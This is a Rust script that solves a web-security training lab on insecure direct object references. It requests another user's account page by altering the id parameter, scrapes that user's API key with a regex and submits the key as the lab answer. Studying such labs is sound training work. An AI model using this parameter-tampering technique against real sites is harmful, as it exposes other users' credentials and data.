/*****************************************************************
*
* Author: Ahmed Elqalaawy (@elqal3awii)
*
* Date: 5/9/2023
*
* Lab: User ID controlled by request parameter
*
* Steps: 1. Fetch the carlos profile using id URL parameter
*        2. Extract the API key
*        3. Submit the solution
*
******************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0ad100a504b907dd8127db270065006e.web-security-academy.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    print!("{} ", "1. Fetching carlos profile page..".white());
    io::stdout().flush();

    // fetch the carlos profile using id URL parameter
    let carlos_profile = client
        .get(format!("{url}/my-account?id=carlos"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch carlos profile".red()));

    println!("{}", "OK".green());
    print!("{} ", "2. Extracting the API key..".white());
    io::stdout().flush();

    // extract the API key of carlos
    let body = carlos_profile.text().unwrap();
    let api_key = capture_pattern("Your API Key is: (.*)</div>", &body)
        .expect(&format!("{}", "[!] Failed to extract the API key".red()));

    println!("{}", "OK".green());
    print!("{} ", "3. Submitting the solution..".white());
    io::stdout().flush();

    // submit the solution
    client
        .post(format!("{url}/submitSolution"))
        .form(&HashMap::from([("answer", api_key)]))
        .send()
        .expect(&format!("{}", "[!] Failed to submit the solution".red()));

    println!("{}", "OK".green());
    println!(
        "{} {}",
        "🗹 Check your browser, it should be marked now as"
            .white()
            .bold(),
        "solved".green().bold()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/********************************************
* Function to capture a pattern form a text
*********************************************/
fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.captures(text) {
        Some(text.get(1).unwrap().as_str().to_string())
    } else {
        None
    }
}

/**********************************************************
* Function to extract session field from the cookie header
***********************************************************/
fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
        Some(session.as_str().to_string())
    } else {
        None
    }
}
